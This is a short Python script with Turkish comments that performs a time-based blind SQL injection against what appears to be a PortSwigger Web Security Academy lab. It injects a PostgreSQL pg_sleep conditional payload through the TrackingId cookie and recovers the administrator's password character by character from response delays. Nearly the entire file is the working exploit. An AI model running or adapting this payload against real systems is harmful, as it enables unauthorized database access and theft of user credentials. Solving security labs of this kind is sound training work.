import requests
import time

# Hedef URL ve sabit veriler
url = "https://0ab400d9044e27b380f908c9000000cf.web-security-academy.net/" # Burayı CTF sorusuna göre güncelle
target_username = "administrator" 
TrackingId_cookie = "0nCBE27smah1HrVX" # Burayı CTF sorusuna göre güncelle
chars = "1234567890qwertyuiopasdfghjklzxcvbnm"
max_length = 20

results = []

print(f"[*] Tarama başlatılıyor: {target_username} kullanıcısının şifresi aranıyor...")

for number in range(1, max_length + 1):
    for char in chars:
        # Payload oluşturma
        payload = f"{TrackingId_cookie}'||(select case when (SUBSTRING(password,{number},1)='{char}') then pg_sleep(5) else pg_sleep(0) end from users where username = '{target_username}' )--"
        
        
        cookies = {'TrackingId': payload} 
        
        start_time = time.time()
        try:
            response = requests.get(url, cookies=cookies, timeout=10)
            end_time = time.time()
            elapsed = end_time - start_time
            
            # Sonucu listeye ekle
            results.append({
                'char': char,
                'pos': number,
                'time': elapsed,
                'payload': payload
            })
            
            # Eğer 5 saniyeden fazla sürdüyse karakter muhtemelen doğrudur
            if elapsed >= 5:
                print(f"[+] Karakter Bulundu! Pozisyon {number}: {char} ({elapsed:.2f}s)")
                break # Bu pozisyon için doğru karakteri bulduysak sonrakine geç
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Hata: {e}")

